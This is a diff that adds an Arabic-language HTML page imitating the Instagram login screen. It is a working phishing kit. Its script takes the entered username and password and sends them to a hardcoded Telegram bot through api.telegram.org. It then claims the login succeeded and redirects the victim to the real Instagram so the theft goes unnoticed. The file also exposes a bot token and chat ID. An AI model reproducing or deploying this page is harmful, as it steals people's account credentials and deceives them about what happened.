@@ -1,0 +1,78 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8" />
+    <title>تسجيل دخول إنستغرام</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-box {
+            background: white;
+            padding: 30px;
+            border: 1px solid #ddd;
+            width: 300px;
+            text-align: center;
+        }
+        input[type="text"], input[type="password"] {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+        }
+        button {
+            background-color: #3897f0;
+            color: white;
+            padding: 10px 0;
+            width: 95%;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Instagram</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required /><br/>
+            <input type="password" id="password" placeholder="كلمة المرور" required /><br/>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const message = encodeURIComponent(`بيانات إنستغرام:\nالمستخدم: ${username}\nكلمة المرور: ${password}`);
+
+            const botToken = '7979180763:AAH4EStSFMoG3LT6Fkz9ATSX82PAfvCxh4M';
+            const chatId = '583977393';
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+
+            try {
+                const response = await fetch(url);
+                if (response.ok) {
+                    alert('تم تسجيل الدخول بنجاح!');
+                    window.location.href = 'https://www.instagram.com/';
+                } else {
+                    alert('حدث خطأ أثناء تسجيل الدخول.');
+                }
+            } catch (error) {
+                alert('حدث خطأ في الاتصال.');
+            }
+        });
+    </script>
+</body>
+</html>
